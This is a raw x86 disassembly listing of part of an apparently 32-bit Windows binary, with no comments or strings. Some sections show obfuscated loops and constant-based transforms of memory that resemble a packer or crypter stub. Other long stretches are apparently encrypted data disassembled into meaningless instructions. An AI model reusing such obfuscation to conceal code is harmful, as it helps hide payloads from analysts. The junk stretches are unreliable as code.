  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433657,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433657
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433657,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433657
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433657,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	jae    0x407be2
  407c4c:	out    dx,eax
  407c4d:	hlt    
  407c4e:	sub    ecx,esp
  407c50:	jle    0x407cd0
  407c52:	add    eax,0x267e7e7c
  407c57:	push   cs
  407c58:	scas   al,BYTE PTR es:[edi]
  407c59:	add    al,0xef
  407c5b:	mov    eax,ds:0xd42b969a
  407c60:	lea    eax,[edx+ebx*2-0x4af1ccef]
  407c67:	add    DWORD PTR ds:0x76b6be8b,esp
  407c6d:	xchg   edi,eax
  407c6e:	adc    eax,0x91bcef8d
  407c73:	int3   
  407c74:	cmp    eax,0x7ec39def
  407c79:	and    edx,ecx
  407c7b:	pusha  
  407c7c:	mov    bl,0xe1
  407c7e:	and    al,0xa6
  407c80:	sbb    DWORD PTR [ebp+0x8070fd3],esi
  407c86:	ja     0x407c20
  407c88:	dec    edi
  407c89:	dec    ebx
  407c8a:	mov    fs,WORD PTR [ebp-0x25e77c38]
  407c90:	xor    ecx,esi
  407c92:	fdivrp st(5),st
  407c94:	retf   
  407c95:	or     DWORD PTR [edi-0x63c090c],ebp
  407c9b:	push   edi
  407c9c:	xchg   esp,eax
  407c9d:	adc    DWORD PTR [edi+ebp*4],0x14929c6a
  407ca4:	mov    ecx,0xee716c01
  407ca9:	mov    dl,0xf4
  407cab:	int    0x6
  407cad:	repnz xchg ecx,eax
  407caf:	adc    eax,0xa6e158bc
  407cb4:	das    
  407cb5:	scas   eax,DWORD PTR es:[edi]
  407cb6:	pop    ebx
  407cb7:	push   edi
  407cb8:	cld    
  407cb9:	xchg   esi,eax
  407cba:	rcl    DWORD PTR [ebx],cl
  407cbc:	int3   
  407cbd:	scas   eax,DWORD PTR es:[edi]
  407cbe:	xchg   ebp,eax
  407cbf:	dec    edi
  407cc0:	repz xchg edx,eax
  407cc2:	cmc    
  407cc3:	(bad)  
  407cc4:	test   eax,0xa3e256a1
  407cc9:	push   ecx
  407cca:	ror    DWORD PTR [esi+0x21cace9c],cl
  407cd0:	jecxz  0x407d1b
  407cd2:	inc    esi
  407cd3:	or     edx,DWORD PTR [edx+0x2d]
  407cd6:	cmp    edx,ecx
  407cd8:	fimul  WORD PTR [ebx+ecx*4]
  407cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cdc:	(bad)  
  407cdd:	cmc    
  407cde:	frstor [eax+esi*1]
  407ce1:	mov    edx,0x1a03cd3e
  407ce6:	and    eax,0xf9dfc4e0
  407ceb:	icebp  
  407cec:	(bad)  
  407ced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cee:	cmp    BYTE PTR [edx-0x695a416],ah
  407cf4:	cwde   
  407cf5:	rcr    DWORD PTR es:[edx+0x49e78169],1
  407cfc:	sub    eax,0x1246b138
  407d01:	ret    0x6d20
  407d04:	adc    eax,0xf135c130
  407d09:	imul   edi,ebp,0x6b
  407d0c:	dec    eax
  407d0d:	shld   DWORD PTR [eax-0xce4a71],ebx,0xa
  407d15:	out    dx,al
  407d16:	fbstp  TBYTE PTR [edi-0x18c9593d]
  407d1c:	jecxz  0x407d2a
  407d1e:	dec    edi
  407d1f:	push   0xfffffff8
  407d21:	push   esp
  407d22:	xchg   ebp,eax
  407d23:	mov    dh,0x45
  407d25:	scas   eax,DWORD PTR es:[edi]
  407d26:	mov    edi,0xaf4694d0
  407d2b:	or     al,dh
  407d2d:	je     0x407d1d
  407d2f:	fisttp QWORD PTR [ebp-0x488c9997]
  407d35:	fcom   QWORD PTR ds:0x42f8ad4b
  407d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d3c:	das    
  407d3d:	leave  
  407d3e:	nop
  407d3f:	in     eax,dx
  407d40:	mov    BYTE PTR [ecx-0x4e],cl
  407d43:	cwde   
  407d44:	fld    QWORD PTR [ecx]
  407d46:	and    eax,0xb6446f65
  407d4b:	in     eax,0xf0
  407d4d:	int3   
  407d4e:	push   ecx
  407d4f:	sbb    ah,BYTE PTR [ecx-0x1d212cc6]
  407d55:	mov    ch,0x2
  407d57:	dec    ebx
  407d58:	jp     0x407d2d
  407d5a:	neg    BYTE PTR [ebp-0x1b56f3ae]
  407d60:	xchg   ebp,eax
  407d61:	and    BYTE PTR [edi+0x4372051c],ah
  407d67:	jb     0x407d93
  407d69:	push   ss
  407d6a:	inc    ecx
  407d6b:	enter  0xc6a5,0xc7
  407d6f:	fld    TBYTE PTR [edi+0x2a]
  407d72:	call   0x333a:0xac4cc7ba
  407d79:	push   0x7a
  407d7b:	xor    BYTE PTR [eax-0x103d2619],ch
  407d81:	inc    cx
  407d83:	arpl   WORD PTR [ecx-0x75],ax
  407d86:	dec    edi
  407d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d88:	out    dx,al
  407d89:	int    0x13
  407d8b:	mov    esp,0x57bc1534
  407d90:	ja     0x407dc2
  407d92:	xor    DWORD PTR [esi+eiz*2-0x62f0f4fd],ebp
  407d99:	retf   
  407d9a:	ret    0x66a5
  407d9d:	inc    eax
  407d9e:	add    esp,DWORD PTR [edi]
  407da0:	pop    ss
  407da1:	mov    edx,0x1f441577
  407da6:	mov    bh,0xe1
  407da8:	ins    BYTE PTR es:[edi],dx
  407da9:	or     eax,0x2316fc58
  407dae:	bound  esi,QWORD PTR [ebx]
  407db0:	scas   eax,DWORD PTR es:[edi]
  407db1:	mov    BYTE PTR [edi+ebx*8],0xc5
  407db5:	mov    bl,BYTE PTR [ecx+ebx*8-0x16]
  407db9:	lods   eax,DWORD PTR ds:[esi]
  407dba:	jo     0x407e1a
  407dbc:	mov    eax,ds:0x2654d697
  407dc1:	icebp  
  407dc2:	les    edx,FWORD PTR [edx-0x702d1f93]
  407dc8:	sub    ecx,esp
  407dca:	jno    0x407dc9
  407dcc:	inc    edx
  407dcd:	jbe    0x407e2b
  407dcf:	repnz not DWORD PTR [eax-0xe]
  407dd3:	inc    edi
  407dd4:	jbe    0x407dc6
  407dd6:	cmp    eax,0xdec03232
  407ddb:	jbe    0x407e20
  407ddd:	sub    ah,BYTE PTR [eax-0x1a]
  407de0:	test   al,0x3c
  407de2:	stos   DWORD PTR es:[edi],eax
  407de3:	cmp    al,0x6c
  407de5:	add    esp,0x16
  407de8:	inc    esi
  407de9:	ja     0x407d7d
  407deb:	ins    DWORD PTR es:[edi],dx
  407dec:	(bad)  
  407ded:	in     eax,dx
  407dee:	mov    ecx,0x39f1dd8a
  407df3:	dec    edi
  407df4:	pop    ds
  407df5:	pop    es
  407df6:	mul    DWORD PTR [edx-0x24]
  407df9:	push   ebx
  407dfa:	inc    DWORD PTR [eax+0x41309e49]
  407e00:	in     al,0xbd
  407e02:	mov    es,ebp
  407e04:	icebp  
  407e05:	(bad)
  407e09:	or     DWORD PTR [ecx],edx
  407e0b:	xor    al,0xe
  407e0d:	pop    ebp
  407e0e:	in     al,dx
  407e0f:	sbb    eax,0x5aa2b2b5
  407e14:	inc    ebx
  407e15:	sti    
  407e16:	loopne 0x407e75
  407e18:	mov    WORD PTR [esi],es
  407e1a:	pop    ds
  407e1b:	ja     0x407e6d
  407e1d:	std    
  407e1e:	sbb    bh,BYTE PTR [edi-0xa0d8c29]
  407e24:	inc    ebp
  407e25:	nop
  407e26:	xchg   esp,eax
  407e27:	test   DWORD PTR [ebx],0xe6790f0
  407e2d:	hlt    
  407e2e:	adc    al,0x38
  407e30:	clc    
  407e31:	cmp    eax,0x152c38e
  407e36:	dec    edi
  407e37:	rol    DWORD PTR [ecx+0x5cbd1925],cl
  407e3d:	jae    0x407e7c
  407e3f:	cmp    ah,BYTE PTR [ecx]
  407e41:	adc    al,0x1
  407e43:	pop    ebp
  407e44:	xlat   BYTE PTR ds:[ebx]
  407e45:	mov    dl,0x5d
  407e47:	fs xor ah,bh
  407e4a:	es out 0xa1,al
  407e4d:	or     DWORD PTR [esi],0xef1372ec
  407e53:	dec    esp
  407e54:	sahf   
  407e55:	test   BYTE PTR [ebx+0x2aecc7],dh
  407e5b:	xor    al,0xec
  407e5d:	mov    eax,ds:0x89d981b5
  407e62:	adc    BYTE PTR [ebx-0xdc20bbb],cl
  407e68:	and    DWORD PTR [edi],esi
  407e6a:	or     BYTE PTR [edi],0x84
  407e6d:	pop    ss
  407e6e:	add    BYTE PTR [eax],al
  407e70:	add    BYTE PTR [ebx+0x881e445],cl
  407e76:	sahf   
  407e77:	sbb    al,0x75
  407e79:	pusha  
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43366b
  407f81:	or     DWORD PTR ds:0x43366f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4336d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4336d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43371b
  407fad:	sub    DWORD PTR ds:0x4336a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43365b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4336ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4336ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4336ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4336ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4336ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4338e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4336ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4336ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4336ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4336ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4336ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4336ab,ebx
  408048:	cmp    DWORD PTR ds:0x4336ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4336ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4336ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4336ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4336ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4335fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4336db
  4080b1:	and    DWORD PTR ds:0x4336e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43369b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433723,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433723
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433723,ebx
  4080e3:	cmp    DWORD PTR ds:0x433723,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4336db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433723,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433723
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433723,ebx
  40811d:	cmp    DWORD PTR ds:0x433723,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433717,0x1f
  40813b:	cmp    DWORD PTR ds:0x433717,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433717,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433717
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433717,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x5bd2730d
  408191:	icebp  
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	xchg   esp,eax
  40819b:	inc    ebx
  40819c:	call   0x19ea7710
  4081a1:	pop    ss
  4081a2:	adc    BYTE PTR [ebx+esi*1],ah
  4081a5:	jne    0x4081b2
  4081a7:	popf   
  4081a8:	or     ah,BYTE PTR [esi+0x6fb540e7]
  4081ae:	fst    DWORD PTR [eax]
  4081b0:	ret    0xd49c
  4081b3:	ficom  DWORD PTR [edx-0x6da308c9]
  4081b9:	adc    al,bh
  4081bb:	jge    0x408209
  4081bd:	sahf   
  4081be:	jb     0x4081c8
  4081c0:	stc    
  4081c1:	pop    esi
  4081c2:	jmp    0x4081d3
  4081c4:	nop
  4081c5:	das    
  4081c6:	push   ss
  4081c7:	and    DWORD PTR [edi+ebp*2+0x641b286d],ecx
  4081ce:	retf   
  4081cf:	sbb    BYTE PTR fs:[ecx-0x1d530963],bh
  4081d6:	stc    
  4081d7:	sbb    al,0x99
  4081d9:	pop    edi
  4081da:	pop    esi
  4081db:	adc    edx,ecx
  4081dd:	inc    ebp
  4081de:	gs mov esp,0xb3efa9ff
  4081e4:	pushf  
  4081e5:	dec    ebp
  4081e6:	and    cl,BYTE PTR [edi]
  4081e8:	push   ss
  4081e9:	test   al,0x2e
  4081eb:	cmc    
  4081ec:	aas    
  4081ed:	xor    DWORD PTR [esi],edi
  4081ef:	or     edi,eax
  4081f1:	xor    DWORD PTR [ecx-0x1ed89be2],edx
  4081f7:	inc    ecx
  4081f8:	push   0xffffffe8
  4081fa:	ds cmc 
  4081fc:	push   ecx
  4081fd:	pop    ebx
  4081fe:	addr16 push ds
  408200:	push   ecx
  408201:	stos   BYTE PTR es:[edi],al
  408202:	test   DWORD PTR [edx+0x1a2d0aa5],edi
  408208:	into   
  408209:	in     eax,dx
  40820a:	inc    esp
  40820b:	jmp    DWORD PTR [edx+0x14]
  40820e:	ja     0x4081c4
  408210:	shr    BYTE PTR [ebp-0x62],1
  408213:	adc    DWORD PTR [edi-0x80],ebp
  408216:	or     BYTE PTR [edx],bl
  408218:	push   ebp
  408219:	int3   
  40821a:	jae    0x40821a
  40821c:	fistp  WORD PTR [ebp+0x478c31e4]
  408222:	jle    0x40827b
  408224:	add    dh,BYTE PTR [esi+0x3c08604b]
  40822a:	or     al,0xd0
  40822c:	loop   0x40824b
  40822e:	repz (bad) 
  408230:	fsubr  st(0),st
  408232:	fisttp DWORD PTR [ebx+0x3a]
  408235:	scas   al,BYTE PTR es:[edi]
  408236:	xchg   ah,bl
  408238:	xor    cl,BYTE PTR [edi]
  40823a:	sub    BYTE PTR [esi+0x597171a6],bl
  408240:	dec    edi
  408241:	sub    BYTE PTR [ebx+0xa],ch
  408244:	cmp    esp,DWORD PTR [ebx+0x1b65a71f]
  40824a:	xor    dl,BYTE PTR [eax+0x73]
  40824d:	fistp  DWORD PTR [ebp-0x4d8a621]
  408253:	sbb    al,0x9c
  408255:	jecxz  0x40825f
  408257:	mov    cl,0x39
  408259:	or     eax,0x6d9a3109
  40825e:	sbb    BYTE PTR [edx],ah
  408260:	mov    ah,0xa0
  408262:	push   ebx
  408263:	shrd   DWORD PTR [edi],eax,cl
  408266:	lahf   
  408267:	aaa    
  408268:	scas   al,BYTE PTR es:[edi]
  408269:	cwde   
  40826a:	sbb    eax,0xd5f79d75
  40826f:	in     eax,dx
  408270:	(bad)  
  408271:	xchg   edx,eax
  408272:	rcr    edi,cl
  408274:	or     cl,al
  408276:	sub    esi,DWORD PTR [eax+0xe]
  408279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40827a:	jmp    0x408237
  40827c:	pushf  
  40827d:	add    DWORD PTR [edx-0x1906fc91],ecx
  408283:	push   edx
  408284:	push   edi
  408285:	jne    0x408249
  408287:	daa    
  408288:	cli    
  408289:	icebp  
  40828a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40828b:	stc    
  40828c:	xchg   ebp,eax
  40828d:	fdivr  QWORD PTR [ecx+0x39]
  408290:	sub    ah,ch
  408292:	xor    ecx,esp
  408294:	ret    
  408295:	sub    dl,BYTE PTR [edi+0x424b73d0]
  40829b:	clc    
  40829c:	xchg   ebx,eax
  40829d:	lock js 0x408239
  4082a0:	fiadd  DWORD PTR [edx+0x168333ca]
  4082a6:	test   BYTE PTR ds:0xb9455e5e,al
  4082ac:	xchg   esp,eax
  4082ad:	out    0xa6,al
  4082af:	mov    esi,ebx
  4082b1:	(bad)  
  4082b2:	jae    0x40827a
  4082b4:	mov    esp,0xcb30b66a
  4082b9:	cwde   
  4082ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082bb:	fldcw  WORD PTR [eax]
  4082bd:	pushf  
  4082be:	push   cs
  4082bf:	daa    
  4082c0:	mov    dh,0xda
  4082c2:	hlt    
  4082c3:	ins    DWORD PTR es:[edi],dx
  4082c4:	icebp  
  4082c5:	and    dh,BYTE PTR [ebp+0x22]
  4082c8:	jmp    0x944f:0x1d54fba0
  4082cf:	bound  ebp,QWORD PTR [ebx-0x7b5187cf]
  4082d5:	in     eax,0xdd
  4082d7:	sbb    edi,DWORD PTR [esi-0x459697f5]
  4082dd:	retf   0xf36e
  4082e0:	xchg   BYTE PTR [edx-0x36],ch
  4082e3:	mov    DWORD PTR [esi-0x8],ebp
  4082e6:	test   eax,0xc8fe60c9
  4082eb:	inc    ecx
  4082ec:	jnp    0x4082b4
  4082ee:	pop    DWORD PTR [ebx+0x45]
  4082f1:	push   ebx
  4082f2:	fdivr  st,st(5)
  4082f4:	loopne 0x4082e6
  4082f6:	xchg   ebx,eax
  4082f7:	inc    ebp
  4082f8:	inc    ecx
  4082f9:	pop    esp
  4082fa:	hlt    
  4082fb:	dec    edi
  4082fc:	jge    0x4082b6
  4082fe:	ss mov ebp,0x96b94166
  408304:	std    
  408305:	ret    
  408306:	test   DWORD PTR [edx],edi
  408308:	xchg   edi,eax
  408309:	add    ebx,DWORD PTR [ecx]
  40830b:	call   0x611a8c40
  408310:	cmp    ch,BYTE PTR [edi]
  408312:	fbld   TBYTE PTR [ebx+0x74]
  408315:	adc    bl,cl
  408317:	adc    eax,0x8a03f7cf
  40831c:	xchg   edx,eax
  40831d:	push   esi
  40831e:	ja     0x4082e3
  408320:	push   0x5a34ff95
  408325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408326:	push   edx
  408327:	mov    edx,0x718b241b
  40832c:	(bad)  
  40832e:	test   BYTE PTR [eax+esi*8-0x54],bh
  408332:	std    
  408333:	jne    0x40833b
  408335:	mov    ch,0xdf
  408337:	cmc    
  408338:	es jmp 0xba93a4df
  40833e:	push   eax
  40833f:	repz add cl,al
  408342:	imul   esi,DWORD PTR [edx-0xe],0x7ea86a72
  408349:	pop    eax
  40834a:	jb     0x4083aa
  40834c:	cwde   
  40834d:	push   edi
  40834e:	pop    esp
  40834f:	push   es
  408350:	shr    DWORD PTR [ebx],cl
  408352:	aas    
  408353:	push   ebx
  408354:	inc    ebx
  408355:	mov    ch,0xb7
  408357:	cdq    
  408358:	mov    al,0xf1
  40835a:	pop    ss
  40835b:	dec    esp
  40835c:	mov    cl,0x31
  40835e:	lea    ebp,[edi-0x69]
  408361:	int3   
  408362:	fld    DWORD PTR ds:0x5a20e368
  408368:	or     dl,BYTE PTR [edi+0x24f40b61]
  40836e:	cld    
  40836f:	adc    DWORD PTR [edx+0x54607dcc],ecx
  408375:	out    0x40,eax
  408377:	loope  0x4083dd
  408379:	ds in  al,dx
  40837b:	sbb    eax,0x1612e57f
  408380:	mov    cs,WORD PTR [ebp+0x16]
  408383:	xchg   edi,eax
  408384:	test   al,ch
  408386:	or     BYTE PTR [edi-0xb],0xb6
  40838a:	scas   eax,DWORD PTR es:[edi]
  40838b:	dec    eax
  40838c:	std    
  40838d:	dec    eax
  40838e:	xor    edx,ebx
  408390:	mov    esp,0x71606aa
  408395:	add    al,0xe9
  408397:	fmul   QWORD PTR [edi-0x6a3a92a6]
  40839d:	sbb    eax,0xc4f0ee4f
  4083a2:	xchg   ebp,eax
  4083a3:	repnz imul ebx,DWORD PTR [eax-0xaa684a2],0x829f4aa9
  4083ae:	xor    ebx,DWORD PTR [edx]
  4083b0:	lea    edi,ds:0x3e66ad61
  4083b6:	sbb    ecx,esp
  4083b8:	jl     0x40833a
  4083ba:	out    dx,al
  4083bb:	icebp  
  4083bc:	mov    dh,0x45
  4083be:	pop    es
  4083bf:	ins    DWORD PTR es:[edi],dx
  4083c0:	into   
  4083c1:	call   0x81e0:0x45892e4f
  4083c8:	and    eax,0x43365b
  4083cd:	add    BYTE PTR [eax],al
  4083cf:	add    BYTE PTR [eax],al
  4083d1:	mov    eax,ds:0x43365b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43365b,eax
  4083dc:	cmp    DWORD PTR ds:0x43365b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43365b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43365b
  40840c:	inc    eax
  40840d:	mov    ds:0x43365b,eax
  408412:	cmp    DWORD PTR ds:0x43365b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43360b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433613,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433727
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	(bad)  
  408465:	ss out 0xb8,al
  408468:	in     al,0xc8
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	push   cs
  408471:	sbb    BYTE PTR [eax-0x1e],dh
  408474:	dec    esi
  408475:	outs   dx,DWORD PTR ds:[esi]
  408476:	cmp    eax,0xea69030a
  40847b:	test   al,0x94
  40847d:	(bad)  
  40847e:	adc    esi,esp
  408480:	leave  
  408481:	int3   
  408482:	inc    eax
  408483:	lea    ecx,[ecx-0x3906c81f]
  408489:	jp     0x4084aa
  40848b:	loopne 0x408474
  40848d:	mov    BYTE PTR [edi+ecx*2],al
  408490:	fistp  DWORD PTR ds:0xc1a4d952
  408496:	xchg   ecx,eax
  408497:	rol    BYTE PTR [eax+edi*8],1
  40849a:	add    DWORD PTR [ebp+0xd],0x4d
  40849e:	lahf   
  40849f:	(bad)  
  4084a1:	sbb    ecx,DWORD PTR [eax+0x1f1426f3]
  4084a7:	xor    ch,BYTE PTR [ebx+0xffa1c43]
  4084ad:	fmul   QWORD PTR ds:0xfbcdd68f
  4084b3:	imul   esi,DWORD PTR [edx],0x9c57f9dd
  4084b9:	jecxz  0x4084ae
  4084bb:	mov    esi,0x43a0ed86
  4084c0:	mov    cl,0xa3
  4084c2:	jle    0x408518
  4084c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084c5:	xchg   ebx,eax
  4084c6:	lahf   
  4084c7:	retf   0x8326
  4084ca:	test   DWORD PTR [edx],edx
  4084cc:	push   0xf896f393
  4084d1:	lods   eax,DWORD PTR ds:[esi]
  4084d2:	add    ebp,eax
  4084d4:	push   ds
  4084d5:	xchg   DWORD PTR [edi-0xd772f40],esi
  4084db:	mov    ebp,cs
  4084dd:	das    
  4084de:	repnz and DWORD PTR [edx+0x47695c70],esi
  4084e5:	fiadd  DWORD PTR [ebx]
  4084e7:	sub    eax,0x5fa564f8
  4084ec:	iret   
  4084ed:	mov    ebp,0xa7f815e9
  4084f2:	and    eax,0x87e677d3
  4084f7:	pop    ecx
  4084f8:	push   cs
  4084f9:	push   esi
  4084fa:	pop    es
  4084fb:	in     al,dx
  4084fc:	into   
  4084fd:	sub    ebx,DWORD PTR [ebx]
  4084ff:	loopne 0x40854b
  408501:	jmp    0xd760:0xbe7838f4
  408508:	test   BYTE PTR [edi+eiz*8-0x6fec0e01],0xa6
